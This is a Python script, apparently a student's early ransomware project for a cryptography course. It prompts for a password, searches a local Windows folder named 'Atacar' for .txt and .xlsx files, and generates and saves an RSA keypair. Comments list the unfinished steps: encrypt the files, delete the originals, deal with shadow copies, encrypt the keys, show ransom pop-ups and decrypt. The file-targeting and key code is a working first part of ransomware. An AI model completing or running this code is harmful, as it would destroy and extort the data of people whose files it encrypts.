import os
import string
import rsa

#Safeguard password
def safeguard():
    psw = input("Contraseña: ")
    if psw != 'cripto':
        quit()


#File extensions to encrypt
def extensions(ext):
    return set(ext)


def find_files(files_location, encrypted_ext):
    file_paths = []
    for root, dirs, files in os.walk(files_location):
        for file in files:
            file_path, file_extension = os.path.splitext(root + '\\' + file)
            if file_extension in encrypted_ext:
                file_paths.append(root + '\\' + file)
    return file_paths


def generate_keys():
    (pubKey, privKey) = rsa.newkeys(1024) # Greater KeySize (bits) =  greater cryptographic strength of the key = slower key generation
    with open('keys/pubKey.pem', 'wb') as f:
        f.write(pubKey.save_pkcs1('PEM')) #TODO PEM = Privacy Enhace Mail or 'DER' format
    
    with open('keys/privkey.pem', 'wb') as f:
        f.write(privKey.save_pkcs1('PEM'))
    
    print(pubKey, "\n")
    print(privKey, "\n")


#TODO: Ver qué hace esto?
def load_keys():
    with open('keys/pubkey.pem', 'rb') as f:
        pubKey = rsa.PublicKey.load_pkcs1(f.read())

    with open('keys/privkey.pem', 'rb') as f:
        privKey = rsa.PrivateKey.load_pkcs1(f.read())

    return pubKey, privKey


def main():
    safeguard()
    encrypted_ext = extensions(('.txt', '.xlsx',))
    files_location = 'C:\\Users\\Pedro\\Documents\\FIUBA\\Cripto\\Atacar'
    paths = find_files(files_location, encrypted_ext)
    
    print(paths, "\n")
    generate_keys()

    # encriptar archivos () y guardarlos encriptados
    # borrar originales y hacer shadowcopy
    # encriptar llaves
    # popups notificando rescate te kbio
    # desencriptar.


main()